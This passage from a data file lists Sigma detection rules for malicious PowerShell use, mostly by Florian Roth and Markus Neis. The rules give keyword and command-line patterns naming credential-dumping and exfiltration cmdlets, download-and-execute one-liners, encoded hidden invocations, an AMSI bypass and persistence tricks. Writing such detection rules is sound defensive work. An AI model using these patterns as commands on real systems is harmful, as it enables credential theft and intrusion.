                           'attack.t1086'],
                  'title': 'PowerShell called from an Executable Version '
                           'Mismatch'}},
 {'data_source': {'author': 'Sean Metcalf (source), Florian Roth (rule)',
                  'description': 'Detects Commandlet names from well-known '
                                 'PowerShell exploitation frameworks',
                  'detection': {'condition': 'keywords and not false_positives',
                                'false_positives': ['Get-SystemDriveInfo'],
                                'keywords': {'Message': ['*Invoke-DllInjection*',
                                                         '*Invoke-Shellcode*',
                                                         '*Invoke-WmiCommand*',
                                                         '*Get-GPPPassword*',
                                                         '*Get-Keystrokes*',
                                                         '*Get-TimedScreenshot*',
                                                         '*Get-VaultCredential*',
                                                         '*Invoke-CredentialInjection*',
                                                         '*Invoke-Mimikatz*',
                                                         '*Invoke-NinjaCopy*',
                                                         '*Invoke-TokenManipulation*',
                                                         '*Out-Minidump*',
                                                         '*VolumeShadowCopyTools*',
                                                         '*Invoke-ReflectivePEInjection*',
                                                         '*Invoke-UserHunter*',
                                                         '*Find-GPOLocation*',
                                                         '*Invoke-ACLScanner*',
                                                         '*Invoke-DowngradeAccount*',
                                                         '*Get-ServiceUnquoted*',
                                                         '*Get-ServiceFilePermission*',
                                                         '*Get-ServicePermission*',
                                                         '*Invoke-ServiceAbuse*',
                                                         '*Install-ServiceBinary*',
                                                         '*Get-RegAutoLogon*',
                                                         '*Get-VulnAutoRun*',
                                                         '*Get-VulnSchTask*',
                                                         '*Get-UnattendedInstallFile*',
                                                         '*Get-ApplicationHost*',
                                                         '*Get-RegAlwaysInstallElevated*',
                                                         '*Get-Unconstrained*',
                                                         '*Add-RegBackdoor*',
                                                         '*Add-ScrnSaveBackdoor*',
                                                         '*Gupt-Backdoor*',
                                                         '*Invoke-ADSBackdoor*',
                                                         '*Enabled-DuplicateToken*',
                                                         '*Invoke-PsUaCme*',
                                                         '*Remove-Update*',
                                                         '*Check-VM*',
                                                         '*Get-LSASecret*',
                                                         '*Get-PassHashes*',
                                                         '*Show-TargetScreen*',
                                                         '*Port-Scan*',
                                                         '*Invoke-PoshRatHttp*',
                                                         '*Invoke-PowerShellTCP*',
                                                         '*Invoke-PowerShellWMI*',
                                                         '*Add-Exfiltration*',
                                                         '*Add-Persistence*',
                                                         '*Do-Exfiltration*',
                                                         '*Start-CaptureServer*',
                                                         '*Get-ChromeDump*',
                                                         '*Get-ClipboardContents*',
                                                         '*Get-FoxDump*',
                                                         '*Get-IndexedItem*',
                                                         '*Get-Screenshot*',
                                                         '*Invoke-Inveigh*',
                                                         '*Invoke-NetRipper*',
                                                         '*Invoke-EgressCheck*',
                                                         '*Invoke-PostExfil*',
                                                         '*Invoke-PSInject*',
                                                         '*Invoke-RunAs*',
                                                         '*MailRaider*',
                                                         '*New-HoneyHash*',
                                                         '*Set-MacAttribute*',
                                                         '*Invoke-DCSync*',
                                                         '*Invoke-PowerDump*',
                                                         '*Exploit-Jboss*',
                                                         '*Invoke-ThunderStruck*',
                                                         '*Invoke-VoiceTroll*',
                                                         '*Set-Wallpaper*',
                                                         '*Invoke-InveighRelay*',
                                                         '*Invoke-PsExec*',
                                                         '*Invoke-SSHCommand*',
                                                         '*Get-SecurityPackages*',
                                                         '*Install-SSP*',
                                                         '*Invoke-BackdoorLNK*',
                                                         '*PowerBreach*',
                                                         '*Get-SiteListPassword*',
                                                         '*Get-System*',
                                                         '*Invoke-BypassUAC*',
                                                         '*Invoke-Tater*',
                                                         '*Invoke-WScriptBypassUAC*',
                                                         '*PowerUp*',
                                                         '*PowerView*',
                                                         '*Get-RickAstley*',
                                                         '*Find-Fruit*',
                                                         '*HTTP-Login*',
                                                         '*Find-TrustedDocuments*',
                                                         '*Invoke-Paranoia*',
                                                         '*Invoke-WinEnum*',
                                                         '*Invoke-ARPScan*',
                                                         '*Invoke-PortScan*',
                                                         '*Invoke-ReverseDNSLookup*',
                                                         '*Invoke-SMBScanner*',
                                                         '*Invoke-Mimikittenz*']}},
                  'falsepositives': ['Penetration testing'],
                  'id': '89819aa4-bbd6-46bc-88ec-c7f7fe30efa6',
                  'level': 'high',
                  'logsource': {'definition': 'It is recommended to use the '
                                              'new "Script Block Logging" of '
                                              'PowerShell v5 '
                                              'https://adsecurity.org/?p=2277',
                                'product': 'windows',
                                'service': 'powershell'},
                  'modified': '2019/01/22',
                  'references': ['https://adsecurity.org/?p=2921'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'Malicious PowerShell Commandlets'}},
 {'data_source': {'author': 'Sean Metcalf (source), Florian Roth (rule)',
                  'description': 'Detects keywords from well-known PowerShell '
                                 'exploitation frameworks',
                  'detection': {'condition': 'keywords',
                                'keywords': {'Message': ['*AdjustTokenPrivileges*',
                                                         '*IMAGE_NT_OPTIONAL_HDR64_MAGIC*',
                                                         '*Microsoft.Win32.UnsafeNativeMethods*',
                                                         '*ReadProcessMemory.Invoke*',
                                                         '*SE_PRIVILEGE_ENABLED*',
                                                         '*LSA_UNICODE_STRING*',
                                                         '*MiniDumpWriteDump*',
                                                         '*PAGE_EXECUTE_READ*',
                                                         '*SECURITY_DELEGATION*',
                                                         '*TOKEN_ADJUST_PRIVILEGES*',
                                                         '*TOKEN_ALL_ACCESS*',
                                                         '*TOKEN_ASSIGN_PRIMARY*',
                                                         '*TOKEN_DUPLICATE*',
                                                         '*TOKEN_ELEVATION*',
                                                         '*TOKEN_IMPERSONATE*',
                                                         '*TOKEN_INFORMATION_CLASS*',
                                                         '*TOKEN_PRIVILEGES*',
                                                         '*TOKEN_QUERY*',
                                                         '*Metasploit*',
                                                         '*Mimikatz*']}},
                  'falsepositives': ['Penetration tests'],
                  'id': 'f62176f3-8128-4faa-bf6c-83261322e5eb',
                  'level': 'high',
                  'logsource': {'definition': 'It is recommended to use the '
                                              'new "Script Block Logging" of '
                                              'PowerShell v5 '
                                              'https://adsecurity.org/?p=2277',
                                'product': 'windows',
                                'service': 'powershell'},
                  'modified': '2019/01/22',
                  'references': ['https://adsecurity.org/?p=2921'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'Malicious PowerShell Keywords'}},
 {'data_source': {'author': 'John Lambert (idea), Florian Roth (rule)',
                  'description': 'Detects PowerShell calling a credential '
                                 'prompt',
                  'detection': {'condition': 'all of them',
                                'keyword': {'Message': ['*PromptForCredential*']},
                                'selection': {'EventID': 4104}},
                  'falsepositives': ['Unknown'],
                  'id': 'ca8b77a9-d499-4095-b793-5d5f330d450e',
                  'level': 'high',
                  'logsource': {'definition': 'Script block logging must be '
                                              'enabled',
                                'product': 'windows',
                                'service': 'powershell'},
                  'references': ['https://twitter.com/JohnLaTwC/status/850381440629981184',
                                 'https://t.co/ezOTGy1a1G'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.credential_access',
                           'attack.t1086'],
                  'title': 'PowerShell Credential Prompt'}},
 {'data_source': {'author': 'Sean Metcalf (source), Florian Roth (rule)',
                  'description': 'Detects the use of PSAttack PowerShell hack '
                                 'tool',
                  'detection': {'condition': 'all of them',
                                'keyword': ['PS ATTACK!!!'],
                                'selection': {'EventID': 4103}},
                  'falsepositives': ['Pentesters'],
                  'id': 'b7ec41a4-042c-4f31-a5db-d0fcde9fa5c5',
                  'level': 'high',
                  'logsource': {'definition': 'It is recommended to use the '
                                              'new "Script Block Logging" of '
                                              'PowerShell v5 '
                                              'https://adsecurity.org/?p=2277',
                                'product': 'windows',
                                'service': 'powershell'},
                  'references': ['https://adsecurity.org/?p=2921'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'PowerShell PSAttack'}},
 {'data_source': {'author': 'David Ledbetter (shellcode), Florian Roth (rule)',
                  'date': '2018/11/17',
                  'description': 'Detects Base64 encoded Shellcode',
                  'detection': {'condition': 'selection and keyword1 and '
                                             'keyword2',
                                'keyword1': ['*AAAAYInlM*'],
                                'keyword2': ['*OiCAAAAYInlM*',
                                             '*OiJAAAAYInlM*'],
                                'selection': {'EventID': 4104}},
                  'falsepositives': ['Unknown'],
                  'id': '16b37b70-6fcf-4814-a092-c36bd3aafcbd',
                  'level': 'critical',
                  'logsource': {'description': 'Script block logging must be '
                                               'enabled',
                                'product': 'windows',
                                'service': 'powershell'},
                  'references': ['https://twitter.com/cyb3rops/status/1063072865992523776'],
                  'status': 'experimental',
                  'tags': ['attack.privilege_escalation',
                           'attack.execution',
                           'attack.t1055',
                           'attack.t1086'],
                  'title': 'PowerShell ShellCode'}},
 {'data_source': {'author': 'Florian Roth',
                  'description': 'Detects suspicious PowerShell download '
                                 'command',
                  'detection': {'condition': 'keywords',
                                'keywords': {'Message': ['*System.Net.WebClient).DownloadString(*',
                                                         '*system.net.webclient).downloadfile(*']}},
                  'falsepositives': ['PowerShell scripts that download content '
                                     'from the Internet'],
                  'id': '65531a81-a694-4e31-ae04-f8ba5bc33759',
                  'level': 'medium',
                  'logsource': {'product': 'windows', 'service': 'powershell'},
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'Suspicious PowerShell Download'}},
 {'data_source': {'author': 'Florian Roth (rule)',
                  'description': 'Detects suspicious PowerShell invocation '
                                 'command parameters',
                  'detection': {'condition': 'all of them',
                                'encoded': [' -enc ', ' -EncodedCommand '],
                                'hidden': [' -w hidden ',
                                           ' -window hidden ',
                                           ' - windowstyle hidden '],
                                'noninteractive': [' -noni ',
                                                   ' -noninteractive ']},
                  'falsepositives': ['Penetration tests',
                                     'Very special / sneaky PowerShell '
                                     'scripts'],
                  'id': '3d304fda-78aa-43ed-975c-d740798a49c1',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'powershell'},
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'Suspicious PowerShell Invocations - Generic'}},
 {'data_source': {'author': 'Florian Roth (rule)',
                  'description': 'Detects suspicious PowerShell invocation '
                                 'command parameters',
                  'detection': {'condition': 'keywords',
                                'keywords': {'Message': ['* -nop -w hidden -c '
                                                         '* '
                                                         '[Convert]::FromBase64String*',
                                                         '* -w hidden -noni '
                                                         '-nop -c '
                                                         '"iex(New-Object*',
                                                         '* -w hidden -ep '
                                                         'bypass -Enc*',
                                                         '*powershell.exe reg '
                                                         'add '
                                                         'HKCU\\software\\microsoft\\windows\\currentversion\\run*',
                                                         '*bypass -noprofile '
                                                         '-windowstyle hidden '
                                                         '(new-object '
                                                         'system.net.webclient).download*',
                                                         '*iex(New-Object '
                                                         'Net.WebClient).Download*']}},
                  'falsepositives': ['Penetration tests'],
                  'id': 'fce5f582-cc00-41e1-941a-c6fabf0fdb8c',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'powershell'},
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'Suspicious PowerShell Invocations - Specific'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2019/02/11',
                  'description': 'Detects keywords that could indicate the use '
                                 'of some PowerShell exploitation framework',
                  'detection': {'condition': 'keywords',
                                'keywords': {'Message': ['*[System.Reflection.Assembly]::Load*']}},
                  'falsepositives': ['Penetration tests'],
                  'id': '1f49f2ab-26bc-48b3-96cc-dcffbc93eadf',
                  'level': 'high',
                  'logsource': {'definition': 'It is recommended to use the '
                                              'new "Script Block Logging" of '
                                              'PowerShell v5 '
                                              'https://adsecurity.org/?p=2277',
                                'product': 'windows',
                                'service': 'powershell'},
                  'references': ['https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'Suspicious PowerShell Keywords'}},
 {'data_source': {'author': 'Markus Neis',
                  'date': '2018/04/07',
                  'description': 'Detects the creation of known powershell '
                                 'scripts for exploitation',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 11,
                                              'TargetFilename': ['*\\Invoke-DllInjection.ps1',
                                                                 '*\\Invoke-WmiCommand.ps1',
                                                                 '*\\Get-GPPPassword.ps1',
                                                                 '*\\Get-Keystrokes.ps1',
                                                                 '*\\Get-VaultCredential.ps1',
                                                                 '*\\Invoke-CredentialInjection.ps1',
                                                                 '*\\Invoke-Mimikatz.ps1',
                                                                 '*\\Invoke-NinjaCopy.ps1',
                                                                 '*\\Invoke-TokenManipulation.ps1',
                                                                 '*\\Out-Minidump.ps1',
                                                                 '*\\VolumeShadowCopyTools.ps1',
                                                                 '*\\Invoke-ReflectivePEInjection.ps1',
                                                                 '*\\Get-TimedScreenshot.ps1',
                                                                 '*\\Invoke-UserHunter.ps1',
                                                                 '*\\Find-GPOLocation.ps1',
                                                                 '*\\Invoke-ACLScanner.ps1',
                                                                 '*\\Invoke-DowngradeAccount.ps1',
                                                                 '*\\Get-ServiceUnquoted.ps1',
                                                                 '*\\Get-ServiceFilePermission.ps1',
                                                                 '*\\Get-ServicePermission.ps1',
                                                                 '*\\Invoke-ServiceAbuse.ps1',
                                                                 '*\\Install-ServiceBinary.ps1',
                                                                 '*\\Get-RegAutoLogon.ps1',
                                                                 '*\\Get-VulnAutoRun.ps1',
                                                                 '*\\Get-VulnSchTask.ps1',
                                                                 '*\\Get-UnattendedInstallFile.ps1',
                                                                 '*\\Get-WebConfig.ps1',
                                                                 '*\\Get-ApplicationHost.ps1',
                                                                 '*\\Get-RegAlwaysInstallElevated.ps1',
                                                                 '*\\Get-Unconstrained.ps1',
                                                                 '*\\Add-RegBackdoor.ps1',
                                                                 '*\\Add-ScrnSaveBackdoor.ps1',
                                                                 '*\\Gupt-Backdoor.ps1',
                                                                 '*\\Invoke-ADSBackdoor.ps1',
                                                                 '*\\Enabled-DuplicateToken.ps1',
                                                                 '*\\Invoke-PsUaCme.ps1',
                                                                 '*\\Remove-Update.ps1',
                                                                 '*\\Check-VM.ps1',
                                                                 '*\\Get-LSASecret.ps1',
                                                                 '*\\Get-PassHashes.ps1',
                                                                 '*\\Show-TargetScreen.ps1',
                                                                 '*\\Port-Scan.ps1',
                                                                 '*\\Invoke-PoshRatHttp.ps1',
                                                                 '*\\Invoke-PowerShellTCP.ps1',
                                                                 '*\\Invoke-PowerShellWMI.ps1',
                                                                 '*\\Add-Exfiltration.ps1',
                                                                 '*\\Add-Persistence.ps1',
                                                                 '*\\Do-Exfiltration.ps1',
                                                                 '*\\Start-CaptureServer.ps1',
                                                                 '*\\Invoke-ShellCode.ps1',
                                                                 '*\\Get-ChromeDump.ps1',
                                                                 '*\\Get-ClipboardContents.ps1',
                                                                 '*\\Get-FoxDump.ps1',
                                                                 '*\\Get-IndexedItem.ps1',
                                                                 '*\\Get-Screenshot.ps1',
                                                                 '*\\Invoke-Inveigh.ps1',
                                                                 '*\\Invoke-NetRipper.ps1',
                                                                 '*\\Invoke-EgressCheck.ps1',
                                                                 '*\\Invoke-PostExfil.ps1',
                                                                 '*\\Invoke-PSInject.ps1',
                                                                 '*\\Invoke-RunAs.ps1',
                                                                 '*\\MailRaider.ps1',
                                                                 '*\\New-HoneyHash.ps1',
                                                                 '*\\Set-MacAttribute.ps1',
                                                                 '*\\Invoke-DCSync.ps1',
                                                                 '*\\Invoke-PowerDump.ps1',
                                                                 '*\\Exploit-Jboss.ps1',
                                                                 '*\\Invoke-ThunderStruck.ps1',
                                                                 '*\\Invoke-VoiceTroll.ps1',
                                                                 '*\\Set-Wallpaper.ps1',
                                                                 '*\\Invoke-InveighRelay.ps1',
                                                                 '*\\Invoke-PsExec.ps1',
                                                                 '*\\Invoke-SSHCommand.ps1',
                                                                 '*\\Get-SecurityPackages.ps1',
                                                                 '*\\Install-SSP.ps1',
                                                                 '*\\Invoke-BackdoorLNK.ps1',
                                                                 '*\\PowerBreach.ps1',
                                                                 '*\\Get-SiteListPassword.ps1',
                                                                 '*\\Get-System.ps1',
                                                                 '*\\Invoke-BypassUAC.ps1',
                                                                 '*\\Invoke-Tater.ps1',
                                                                 '*\\Invoke-WScriptBypassUAC.ps1',
                                                                 '*\\PowerUp.ps1',
                                                                 '*\\PowerView.ps1',
                                                                 '*\\Get-RickAstley.ps1',
                                                                 '*\\Find-Fruit.ps1',
                                                                 '*\\HTTP-Login.ps1',
                                                                 '*\\Find-TrustedDocuments.ps1',
                                                                 '*\\Invoke-Paranoia.ps1',
                                                                 '*\\Invoke-WinEnum.ps1',
                                                                 '*\\Invoke-ARPScan.ps1',
                                                                 '*\\Invoke-PortScan.ps1',
                                                                 '*\\Invoke-ReverseDNSLookup.ps1',
                                                                 '*\\Invoke-SMBScanner.ps1',
                                                                 '*\\Invoke-Mimikittenz.ps1']}},
                  'falsepositives': ['Penetration Tests'],
                  'id': 'f331aa1f-8c53-4fc3-b083-cc159bc971cb',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://raw.githubusercontent.com/Neo23x0/sigma/f35c50049fa896dff91ff545cb199319172701e8/rules/windows/powershell/powershell_malicious_commandlets.yml'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'Malicious PowerShell Commandlet Names'}},
 {'data_source': {'author': 'Florian Roth',
                  'description': 'Detects a Powershell process that opens '
                                 'network connections - check for suspicious '
                                 'target ports and target systems - adjust to '
                                 'your environment (e.g. extend filters with '
                                 "company's ip range')",
                  'detection': {'condition': 'selection and not filter',
                                'filter': {'DestinationIp': ['10.*',
                                                             '192.168.*',
                                                             '172.16.*',
                                                             '172.17.*',
                                                             '172.18.*',
                                                             '172.19.*',
                                                             '172.20.*',
                                                             '172.21.*',
                                                             '172.22.*',
                                                             '172.23.*',
                                                             '172.24.*',
                                                             '172.25.*',
                                                             '172.26.*',
                                                             '172.27.*',
                                                             '172.28.*',
                                                             '172.29.*',
                                                             '172.30.*',
                                                             '172.31.*',
                                                             '127.0.0.1'],
                                           'DestinationIsIpv6': 'false',
                                           'User': 'NT AUTHORITY\\SYSTEM'},
                                'selection': {'EventID': 3,
                                              'Image': '*\\powershell.exe',
                                              'Initiated': 'true'}},
                  'falsepositives': ['Administrative scripts'],
                  'id': '1f21ec3f-810d-4b0e-8045-322202e22b4b',
                  'level': 'low',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://www.youtube.com/watch?v=DLtJTxMWZ2o'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'PowerShell Network Connections'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/06/25',
                  'description': 'Detects PowerShell remote thread creation in '
                                 'Rundll32.exe',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 8,
                                              'SourceImage': '*\\powershell.exe',
                                              'TargetImage': '*\\rundll32.exe'}},
                  'falsepositives': ['Unkown'],
                  'id': '99b97608-3e21-4bfe-8217-2a127c396a0e',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.execution',
                           'attack.t1085',
                           'attack.t1086'],
                  'title': 'PowerShell Rundll32 Remote Thread Creation'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2019/04/15',
                  'description': 'Detects suspicious scripting in WMI Event '
                                 'Consumers',
                  'detection': {'condition': 'selection',
                                'selection': {'Destination': ['*new-object '
                                                              'system.net.webclient).downloadstring(*',
                                                              '*new-object '
                                                              'system.net.webclient).downloadfile(*',
                                                              '*new-object '
                                                              'net.webclient).downloadstring(*',
                                                              '*new-object '
                                                              'net.webclient).downloadfile(*',
                                                              '* iex(*',
                                                              '*WScript.shell*',
                                                              '* -nop *',
                                                              '* -noprofile *',
                                                              '* -decode *',
                                                              '* -enc *'],
                                              'EventID': 20}},
                  'falsepositives': ['Administrative scripts'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': 'fe21810c-2a8c-478f-8dd3-5a287fb2a0e0',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://in.security/an-intro-into-abusing-and-identifying-wmi-event-subscriptions-for-persistence/',
                                 'https://github.com/Neo23x0/signature-base/blob/master/yara/gen_susp_lnk_files.yar#L19'],
                  'status': 'experimental',
                  'tags': ['attack.t1086', 'attack.execution'],
                  'title': 'Suspicious Scripting in a WMI Consumer'}},
 {'data_source': {'author': 'Markus Neis',
                  'date': '2018/08/17',
                  'description': 'Detects Request to amsiInitFailed that can '
                                 'be used to disable AMSI Scanning',
                  'detection': {'condition': 'selection1 and selection2',
                                'falsepositives': ['Potential Admin Activity'],
                                'selection1': {'CommandLine': ['*System.Management.Automation.AmsiUtils*']},
                                'selection2': {'CommandLine': ['*amsiInitFailed*']}},
                  'id': '30edb182-aa75-42c0-b0a9-e998bb29067c',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://twitter.com/mattifestation/status/735261176745988096',
                                 'https://www.hybrid-analysis.com/sample/0ced17419e01663a0cd836c9c2eb925e3031ffb5b18ccf35f4dea5d586d0203e?environmentId=120'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.defense_evasion',
                           'attack.t1086'],
                  'title': 'Powershell AMSI Bypass via .NET Reflection'}},
 {'data_source': {'author': 'Markus Neis',
                  'date': '2018/08/25',
                  'description': 'Detects PowerShell Strings applied to '
                                 'rundllas seen in PowerShdll.dll',
                  'detection': {'condition': '(selection1 or selection2) and '
                                             'selection3',
                                'selection1': {'Image': ['*\\rundll32.exe']},
                                'selection2': {'Description': ['*Windows-Hostprozess '
                                                               '(Rundll32)*']},
                                'selection3': {'CommandLine': ['*Default.GetString*',
                                                               '*FromBase64String*']}},
                  'falsepositives': ['Unknown'],
                  'id': '6812a10b-60ea-420c-832f-dfcc33b646ba',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://github.com/p3nt4/PowerShdll/blob/master/README.md'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.t1086',
                           'car.2014-04-003'],
                  'title': 'Detection of PowerShell Execution via DLL'}},
 {'data_source': {'author': 'Florian Roth',
                  'description': 'Detects a Powershell process that contains '
                                 'download commands in its command line string',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['*new-object '
                                                              'system.net.webclient).downloadstring(*',
                                                              '*new-object '
                                                              'system.net.webclient).downloadfile(*',
                                                              '*new-object '
                                                              'net.webclient).downloadstring(*',
                                                              '*new-object '
                                                              'net.webclient).downloadfile(*'],
                                              'Image': '*\\powershell.exe'}},
                  'falsepositives': ['unknown'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': '3b6ab547-8ec2-4991-b9d2-2b06702a48d7',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'status': 'experimental',
                  'tags': ['attack.t1086', 'attack.execution'],
                  'title': 'PowerShell Download from URL'}},
 {'data_source': {'author': 'Florian Roth (rule), Daniel Bohannon (idea), '
                            'Roberto Rodriguez (Fix)',
                  'description': 'Detects suspicious PowerShell invocation '
                                 'with a parameter substring',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': [' -windowstyle '
                                                              'h ',
                                                              ' -windowstyl h',
                                                              ' -windowsty h',
                                                              ' -windowst h',
                                                              ' -windows h',
                                                              ' -windo h',
                                                              ' -wind h',
                                                              ' -win h',
                                                              ' -wi h',
                                                              ' -win h ',
                                                              ' -win hi ',
                                                              ' -win hid ',
                                                              ' -win hidd ',
                                                              ' -win hidde ',
                                                              ' -NoPr ',
                                                              ' -NoPro ',
                                                              ' -NoProf ',
                                                              ' -NoProfi ',
                                                              ' -NoProfil ',
                                                              ' -nonin ',
                                                              ' -nonint ',
                                                              ' -noninte ',
                                                              ' -noninter ',
                                                              ' -nonintera ',
                                                              ' -noninterac ',
                                                              ' -noninteract ',
                                                              ' -noninteracti ',
                                                              ' '
                                                              '-noninteractiv ',
                                                              ' -ec ',
                                                              ' '
                                                              '-encodedComman ',
                                                              ' -encodedComma ',
                                                              ' -encodedComm ',
                                                              ' -encodedCom ',
                                                              ' -encodedCo ',
                                                              ' -encodedC ',
                                                              ' -encoded ',
                                                              ' -encode ',
                                                              ' -encod ',
                                                              ' -enco ',
                                                              ' -en '],
                                              'Image': ['*\\Powershell.exe']}},
                  'falsepositives': ['Penetration tests'],
                  'id': '36210e0d-5b19-485d-a087-c096088885f0',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'Suspicious PowerShell Parameter Substring'}},
 {'data_source': {'author': 'Sami Ruohonen',
                  'date': '2018/09/05',
                  'description': 'Detects suspicious powershell process which '
                                 'includes bxor command, alternatvide '
                                 'obfuscation method to b64 encoded commands.',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['* -bxor*']}},
                  'falsepositives': ['unknown'],
                  'id': 'bb780e0c-16cf-4383-8383-1e5471db6cf9',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'Suspicious XOR Encoded PowerShell Command Line'}},
 {'data_source': {'author': 'Markus Neis, @Karneades',
                  'date': '2018/03/06',
                  'description': 'Detects the creation of a schtask via '
                                 'PowerSploit or Empire Default Configuration.',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['*schtasks*/Create*/SC '
                                                              '*ONLOGON*/TN '
                                                              '*Updater*/TR '
                                                              '*powershell*',
                                                              '*schtasks*/Create*/SC '
                                                              '*DAILY*/TN '
                                                              '*Updater*/TR '
                                                              '*powershell*',
                                                              '*schtasks*/Create*/SC '
                                                              '*ONIDLE*/TN '
                                                              '*Updater*/TR '
                                                              '*powershell*',
                                                              '*schtasks*/Create*/SC '
                                                              '*Updater*/TN '
                                                              '*Updater*/TR '
                                                              '*powershell*'],
                                              'ParentImage': ['*\\powershell.exe']}},
                  'falsepositives': ['False positives are possible, depends on '
                                     'organisation and processes'],
                  'id': '56c217c3-2de2-479b-990f-5c109ba8458f',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1',
                                 'https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/userland/schtasks.py',
                                 'https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/elevated/schtasks.py'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.persistence',
                           'attack.privilege_escalation',
                           'attack.t1053',
                           'attack.t1086',
                           'attack.s0111',
                           'attack.g0022',
                           'attack.g0060',
                           'car.2013-08-001'],
                  'title': 'Default PowerSploit and Empire Schtasks '
                           'Persistence'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2019/04/20',
                  'description': 'Detects suspicious powershell command line '
                                 'parameters used in Empire',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['* -NoP -sta '
                                                              '-NonI -W Hidden '
                                                              '-Enc *',
                                                              '* -noP -sta -w '
                                                              '1 -enc *',
                                                              '* -NoP -NonI -W '
                                                              'Hidden -enc '
                                                              '*']}},
                  'id': '79f4ede3-402e-41c8-bc3e-ebbf5f162581',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165',
                                 'https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191',
                                 'https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178',
                                 'https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'Empire PowerShell Launch Parameters'}},
 {'data_source': {'author': 'Florian Roth, Markus Neis',
                  'date': '2018/09/03',
                  'description': 'Detects suspicious powershell process starts '
                                 'with base64 encoded commands',
                  'detection': {'condition': 'selection and not falsepositive1',
                                'falsepositive1': {'CommandLine': '* '
                                                                  '-ExecutionPolicy '
                                                                  'remotesigned '
                                                                  '*'},
                                'selection': {'CommandLine': ['* -e JAB*',
                                                              '* -e  JAB*',
                                                              '* -e   JAB*',
                                                              '* -e    JAB*',
                                                              '* -e     JAB*',
                                                              '* -e      JAB*',
                                                              '* -enc JAB*',
                                                              '* -enco JAB*',
                                                              '* '
                                                              '-encodedcommand '
                                                              'JAB*',
                                                              '* BA^J e-',
                                                              '* -e SUVYI*',
                                                              '* -e aWV4I*',
                                                              '* -e SQBFAFgA*',
                                                              '* -e aQBlAHgA*',
                                                              '* -enc SUVYI*',
                                                              '* -enc aWV4I*',
                                                              '* -enc '
                                                              'SQBFAFgA*',
                                                              '* -enc '
                                                              'aQBlAHgA*']}},
                  'id': 'ca2092a1-c273-4878-9b4b-0d60115bf5ea',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/07/30',
                  'references': ['https://app.any.run/tasks/6217d77d-3189-4db2-a957-8ab239f3e01e'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1086'],
                  'title': 'Suspicious Encoded PowerShell Command Line'}},
